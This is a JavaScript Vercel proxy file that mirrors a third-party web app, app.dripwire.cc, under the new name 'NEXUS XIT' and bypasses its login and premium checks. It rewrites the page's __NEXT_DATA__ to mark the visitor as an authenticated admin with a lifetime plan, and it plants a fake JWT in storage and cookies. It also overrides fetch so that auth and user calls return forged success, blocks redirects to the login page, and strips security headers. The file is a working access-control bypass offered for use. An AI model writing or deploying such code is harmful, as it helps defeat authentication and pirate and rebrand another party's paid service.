// language: JavaScript, file: api/proxy.js, runtime: Vercel Node 20

const TARGET_ORIGIN = "https://app.dripwire.cc";
const NEW_NAME = "NEXUS XIT";

const REPLACEMENTS = [
  ["DRIP WIRE", NEW_NAME],
  ["Drip Wire", NEW_NAME],
  ["dripwire", NEW_NAME.toLowerCase()],
];

const DROP_RESPONSE_HEADERS = new Set([
  "content-security-policy", "content-security-policy-report-only", "x-frame-options",
  "content-length", "content-encoding", "transfer-encoding", "connection", "strict-transport-security",
]);

function renameInHtmlTextNodes(html) {
  return html.replace(
    /(<script\b[^>]*>[\s\S]*?<\/script>)|(<style\b[^>]*>[\s\S]*?<\/style>)|(<[^>]*>)|([^<]+)/gi,
    (m, _s, _st, _tag, text) => {
      if (text === undefined) return m;
      let out = text;
      for (const [oldT, newT] of REPLACEMENTS) {
        if (out.indexOf(oldT) !== -1) out = out.split(oldT).join(newT);
      }
      return out;
    }
  );
}

// ==== KUNCI UTAMA: BAJAK __NEXT_DATA__ ====
function spoofNextData(html) {
  const fakeUser = JSON.stringify({
    id: "1", name: "Nexus", email: "nexus@local.host", role: "admin",
    premium: true, status: "active", plan: "lifetime",
  });
  const fakeToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";

  return html.replace(
    /<script\s+id="__NEXT_DATA__"[^>]*>([\s\S]*?)<\/script>/i,
    (match, jsonText) => {
      try {
        const data = JSON.parse(jsonText);
        
        function flip(obj) {
          if (!obj || typeof obj !== "object") return;
          for (const k of Object.keys(obj)) {
            const lk = k.toLowerCase();
            if (["authenticated","isauthenticated","isloggedin","loggedin","valid","authorized","success","isvalid","premium","ispremium","active"].includes(lk)) {
              obj[k] = true;
            }
            else if (["token","accesstoken","session","apikey","key"].includes(lk)) {
              obj[k] = fakeToken;
            }
            else if (lk === "user" || lk === "account" || lk === "profile") {
              obj[k] = JSON.parse(fakeUser);
            }
            else if (obj[k] && typeof obj[k] === "object") {
              flip(obj[k]);
            }
          }
        }
        flip(data);

        if (data.props && data.props.pageProps) {
          data.props.pageProps.user = JSON.parse(fakeUser);
          data.props.pageProps.isLoggedIn = true;
          data.props.pageProps.token = fakeToken;
        }

        // Escape '<' biar JSON nggak ngerusak tag <script>
        const safeJson = JSON.stringify(data).replace(/</g, '\\u003c');
        return `<script id="__NEXT_DATA__" type="application/json">${safeJson}</script>`;
      } catch (e) {
        return match;
      }
    }
  );
}

function stripCookieDomain(cookie) {
  let c = cookie.replace(/;\s*domain=[^;]*/gi, "");
  if (!/samesite=/i.test(c)) c += "; SameSite=None";
  if (!/secure/i.test(c)) c += "; Secure";
  if (!/path=/i.test(c)) c += "; Path=/";
  return c;
}

function buildClientScript() {
  return `
  <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
  <script>try { eruda.init(); } catch(e) {}</script>
  <script>
  (function(){
    var FAKE_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
    try {
      localStorage.setItem('token', FAKE_JWT);
      localStorage.setItem('auth', 'true');
      localStorage.setItem('isLoggedIn', 'true');
      document.cookie = "token=" + FAKE_JWT + "; path=/";
    } catch(e){}

    var _rep = location.replace.bind(location);
    location.replace = function(u){ if(u === "/" || /\\/login/.test(u)) return; _rep(u); };
    
    var _push = history.pushState;
    history.pushState = function(s,t,u){ if(u === "/" || /\\/login/.test(u)) return; _push.apply(this, arguments); };

    var _f = window.fetch;
    window.fetch = function(i, init){
      var u = typeof i === "string" ? i : (i ? i.url : "");
      if (/\\/api\\/|verify|auth|login|check|user|me/i.test(u)) {
        return Promise.resolve(new Response(JSON.stringify({
          status:"success", valid:true, success:true, authenticated:true, token:FAKE_JWT,
          user: {id:"1", name:"Nexus", premium:true, role:"admin"}, 
          data: {token:FAKE_JWT, user:{id:"1", name:"Nexus", premium:true}}
        }), {status:200, headers:{'Content-Type':'application/json'}}));
      }
      return _f.call(this, i, init);
    };
  })();
  </script>`;
}

export default async function handler(req, res) {
  if (req.method === "OPTIONS") return res.status(204).end();

  try {
    let path = (req.query.path || "").replace(/^\/+/, "");
    
    if (path.startsWith("api/proxy")) {
      path = path.replace("api/proxy", "");
      if (path.startsWith("?")) path = path.substring(1);
    }

    // LANGSUNG TEMBAK /home KALAU LU BUKA ROOT
    if (!path) {
      path = "home"; 
    }

    const searchParams = new URLSearchParams();
    for (const [key, value] of Object.entries(req.query)) {
      if (key !== "path") searchParams.append(key, value);
    }
    const query = searchParams.toString() ? `?${searchParams.toString()}` : "";
    const targetUrl = `${TARGET_ORIGIN}/${path}${query}`;

    const fwd = {};
    for (const [key, value] of Object.entries(req.headers)) {
      const k = key.toLowerCase();
      if (["host", "connection", "content-length", "accept-encoding"].includes(k)) continue;
      fwd[k] = value;
    }
    fwd["origin"] = TARGET_ORIGIN;
    fwd["cookie"] = (fwd["cookie"] ? fwd["cookie"] + "; " : "") + "token=bypass; session=bypass; auth=true";
    if (req.headers["referer"]) {
      fwd["referer"] = req.headers["referer"].replace(`https://${req.headers["host"]}`, TARGET_ORIGIN);
    }

    const upstream = await fetch(targetUrl, { method: req.method, headers: fwd, redirect: "manual" });

    let setCookies = [];
    if (typeof upstream.headers.getSetCookie === "function") setCookies = upstream.headers.getSetCookie();
    else { const single = upstream.headers.get("set-cookie"); if (single) setCookies = [single]; }
    if (setCookies.length) res.setHeader("set-cookie", setCookies.map(stripCookieDomain));

    if ([301, 302, 303, 307, 308].includes(upstream.status)) {
      const loc = upstream.headers.get("location") || "/";
      if (loc === "/" || loc === "" || loc.includes("login")) {
        res.writeHead(302, { Location: "/home", "Cache-Control": "no-store" });
        return res.end();
      }
      res.writeHead(upstream.status, { Location: loc, "Cache-Control": "no-store" });
      return res.end();
    }

    const ct = upstream.headers.get("content-type") || "";

    if (ct.includes("text/html")) {
      let html = await upstream.text();

      html = spoofNextData(html);
      html = renameInHtmlTextNodes(html);

      const script = "\n" + buildClientScript(); // Kasih newline biar nggak nyambung ke script React
      html = /<\/body>/i.test(html) ? html.replace(/<\/body>/i, () => script + "</body>") : html + script;

      res.statusCode = upstream.status;
      res.setHeader("content-type", "text/html; charset=utf-8");
      res.setHeader("cache-control", "private, no-store, max-age=0, must-revalidate");
      for (const [k, v] of upstream.headers) {
        if (!DROP_RESPONSE_HEADERS.has(k.toLowerCase()) && k.toLowerCase() !== "set-cookie") res.setHeader(k, v);
      }
      return res.end(html);
    }

    const buf = Buffer.from(await upstream.arrayBuffer());
    res.statusCode = upstream.status;
    res.setHeader("content-type", ct || "application/octet-stream");
    for (const [k, v] of upstream.headers) {
      if (!DROP_RESPONSE_HEADERS.has(k.toLowerCase()) && k.toLowerCase() !== "set-cookie") res.setHeader(k, v);
    }
    return res.end(buf);

  } catch (err) {
    res.statusCode = 502;
    res.setHeader("content-type", "text/plain; charset=utf-8");
    return res.end("proxy error: " + (err && err.message ? err.message : String(err)));
  }
}
